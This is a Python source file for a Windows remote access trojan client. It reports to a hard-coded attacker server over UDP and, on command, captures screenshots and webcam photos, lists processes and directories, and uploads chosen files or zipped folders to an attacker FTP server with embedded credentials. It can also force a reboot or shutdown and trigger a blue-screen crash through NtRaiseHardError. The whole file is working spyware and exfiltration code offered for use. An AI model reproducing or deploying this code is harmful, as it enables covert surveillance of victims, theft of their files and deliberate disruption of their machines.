import os                  # CMD COMMANDS
import cv2                 # WEBCAM SCREEN
import shutil              # ZIP MAKE
import socket              # SERVER
import threading           # FTP SERVER
from ftplib import FTP     # FTP SERVER
from PIL import ImageGrab  # SCREENSHOTS

######################################
######### GLOBAL VARIABLES ###########
######################################

server_address = '10.1.19.139'
#server_address = '10.1.18.200'
#server_address = '157.245.7.127'
#server_address = '127.0.0.1'

server_port = 8000
server = server_address, server_port
alias = os.getlogin()

ftp_session = FTP()
FTP_SERVER = server_address
FTP_PORT = 8001

######################################
############# FUNCTIONS ##############
######################################


################################
   ###### REMOVE FILE ######
################################
def remove_file(filename):
  try:
    os.remove(f'C:\\ProgramData\\{filename}')
  except:
    client_socket.sendto(f'\t[*] Error removing {filename}!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
  pass

################################
   ###### GET TASKLIST ######
################################

def get_tasklist():
  try:
    client_socket.sendto(f'[*] Uploading...'.encode(), server)
    os.system('tasklist>  C:\\ProgramData\\Tasklist.txt')
    tasklist = open('C:\\ProgramData\\Tasklist.txt')
    send_to_ftp('Tasklist.txt')
    tasklist.close()
    os.remove('C:\\ProgramData\\Tasklist.txt')
  except:
    client_socket.sendto(f'\t[*] UPLOAD ERROR!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
  pass

################################
  ###### SEND TO FTP ######
################################

def send_to_ftp(filename):
  try:
    ftp_session.connect(FTP_SERVER, FTP_PORT)
    ftp_session.login('Y7V', 'PSWD')
    filepath = open(f'C:\\ProgramData\\{filename}', 'rb')
    ftp_session.storbinary('STOR ' + filename, filepath)
    client_socket.sendto(f'\t[*] Sending complete!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
    filepath.close()
  except:
    client_socket.sendto(f'\t[*] Sending failed!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
  pass

################################
  ###### UPLOAD TO FTP ######
################################
def upload_to_ftp(filename, path):
  try:
    ftp_session.connect(FTP_SERVER, FTP_PORT)
    ftp_session.login('Y7V', 'PSWD')
    client_socket.sendto(f'\t[*] {filename}'.encode(), server)
    client_socket.sendto(f'\t[*] Connecting to FTP...'.encode(), server)
    filepath = open(path + f'\\{filename}', 'rb')
    client_socket.sendto(f'\t[*] Processing...'.encode(), server)
    ftp_session.storbinary('STOR ' + filename, filepath)
    client_socket.sendto(f'\t[*] Sending complete!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
    #remove_file(filename)
  except:
    client_socket.sendto(f'\t[*] Archieving...'.encode(), server)
    shutil.make_archive(f'C:\\ProgramData\\{filename}','zip',os.getcwd()+f'\\{filename}\\')
    filepath = open(f'C:\\ProgramData\\{filename}.zip', 'rb')
    ftp_session.storbinary(f'STOR {filename}.zip', filepath)
    client_socket.sendto(f'\t[*] Sending complete!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
    #remove_file(filename+'.zip')
  pass

################################
  ###### WINDOW SCREEN ######
################################

def window_screen():
  filename = 'Screen.jpg'
  client_socket.sendto(f'\t[*] Creating screenshot...'.encode(), server)
  #try:
  screen = ImageGrab.grab()
  screen.save(os.getenv('ProgramData') + f'\\{filename}')
  client_socket.sendto(f'\t[*] Sending to ftp...'.encode(), server)
  send_to_ftp(filename)
  remove_file(filename)
    #client_socket.sendto(b'\t[*] [!]', server)
  #except:
  #client_socket.sendto(f'\t[*] Unknown error!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
  pass

################################
  ###### WEBCAM SCREEN ######
################################

def webcam_screen():
  filename = 'webcam.jpg'
  try:
    cap = cv2.VideoCapture(0)
    client_socket.sendto(f'\t[*] Creating photo...'.encode(), server)
    for i in range(30):
      cap.read()
    ret, frame = cap.read()
    cv2.imwrite(f'C:\\ProgramData\\{filename}', frame)
    cap.release()
    client_socket.sendto(f'\t[*] Sending to ftp...'.encode(), server)
    send_to_ftp(filename)
    client_socket.sendto(f'\t[*] Complete!'.encode(), server)
    remove_file(filename)
    #client_socket.sendto(b'\t[*] [!]', server)
  except:
    client_socket.sendto(f'\t[*] Webcam not found!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
  pass

################################
      ###### REBOOT ######
################################
def reboot():
  try:
    #client_socket.sendto(b'\t[*] [!]', server)
    os.system('shutdown -r /t 0 /f')
  except:
    client_socket.sendto(f'\t[*] Cannot execute command!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
  pass

def poweroff():
  try:
    #client_socket.sendto(b'\t[*] [!]', server)
    os.system('shutdown -s /t 0 /f')
  except:
    client_socket.sendto(f'\t[*] Cannot execute command!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
  pass

################################
       ###### BSoD ######
################################

def BSoD():
  try:
    #client_socket.sendto(b'\t[*] [!]', server)
    tmp1 = c_bool()
    tmp2 = DWORD()
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
  except:
    client_socket.sendto(f'\t[*] Cannot execute command!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
  pass

def get_directory():
  file_list = os.listdir(path=".")
  client_socket.sendto(f'\n\t[*] CURRENT DIRECTORY: {os.getcwd()}\n'.encode(), server)
  client_socket.sendto(b'\n[M] FILES:', server)
  #client_socket.sendto(b'\t[*] [!]', server)
  for i in file_list:
    client_socket.sendto(f'\t[*] {i}'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
  pass

def change_directory(message):
  try:
    message = message.split(' ')
    directory = message[1]
    os.chdir(directory)
    client_socket.sendto(f'\n[*] NEW DIRECTORY: {os.getcwd()}\n'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
  except:
    client_socket.sendto(f'\t[*] Unknown directory!'.encode(), server)
    #client_socket.sendto(b'\t[*] [!]', server)
  pass

def download_file(message):
  filename = message[3:]
  upload_to_ftp(filename,os.getcwd())
  pass

def receive():
  while True:
    data = client_socket.recv(1024)
    message = data.decode()

    match message:
      case 'S':
        window_screen()
      case 'WS':
        webcam_screen()
      case 'R':
        reboot()
      case 'P':
        poweroff()
      case 'B':
        BSoD()
      case 'LS':
        get_directory()
      case 'TL':
        get_tasklist()
      case _:
        pass
    if 'CD' in message:
      change_directory(message)
    if 'DL' in message:
      download_file(message)



######################################
######### CONNECT TO SERVER ##########
######################################

client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client_socket.bind(('', 9000))
client_socket.sendto(f'Alias: {alias}'.encode('utf-8'), server)
print('Sucessfully connected!')
thread = threading.Thread(target=receive)
thread.start()
